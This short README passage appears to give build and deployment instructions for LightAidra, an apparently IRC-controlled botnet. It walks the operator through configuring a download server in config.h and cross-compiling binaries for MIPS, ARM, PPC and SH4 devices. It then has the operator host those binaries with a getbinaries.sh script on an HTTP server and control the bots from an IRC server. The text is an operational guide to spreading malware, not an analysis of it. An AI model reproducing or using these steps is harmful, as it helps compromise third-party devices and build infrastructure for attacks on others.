    --> IF CROSS COMPILERS ARE NOT INCLUDED IN BIN/ DIRECTORY YOU WILL NEED
        TO DOWNLOAD THESE LINKS AND EXTRACT THEM INTO LIGHTAIDRA/BIN/

	--> CONFIGURE YOUR LIGHTAIDRA:
	--> IMPORTANT: REFERENCE_HTTP IN CONFIG.H MUST BE THE SERVER
		WHERE YOU UPLOAD THE BINARIES (MIPS*, ARM, PPC, SH4) AND GETBINARIES.SH.
		IF YOU CHANGE "NAME OF BINARIES" YOU NEED TO UPDATE MAKEFILE
		AND GETBINARIES.SH TOO!
	$ vi include/config.h

	--> BUILD BINARIES (JUST TO START :))
    $ make x86_32 (for 32bit)
    $ make x86_64 (for 64bit)
    # ./bin/x86_64

	--> BUILD BINARIES FOR MIPSEL, MIPS, ARM, PPC, SH4
    $ make mipsel mips arm ppc superh

	--> NOW START YOUR HTTPD AND UPLOAD THE BINARIES AND GETBINARIES.SH!
	
    * Now go to your irc server and manage your Aidra!
